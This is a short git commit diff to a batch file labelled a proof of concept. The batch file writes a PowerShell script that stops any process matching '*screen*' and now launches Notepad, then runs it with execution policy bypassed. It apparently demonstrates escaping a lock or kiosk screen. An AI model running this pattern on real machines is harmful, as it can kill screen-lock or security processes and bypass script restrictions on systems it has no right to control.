e862f524f3151526b7985ee18372f35dc8651165
Luke Arntson <arntsonl@gmail.com>
2017-03-07 13:54:44 -0500

    Adding notepad for poc

--- files/su.bat
+++ files/su.bat
@@ -1,4 +1,5 @@
 @echo off
 echo Stop-Process -processname *screen* > c:\windows\temp\su.ps1
+echo Start-Process c:\windows\system32\notepad.exe >> c:\windows\temp\su.ps1
 powershell -executionPolicy bypass -command "c:\windows\temp\su.ps1"
 pause
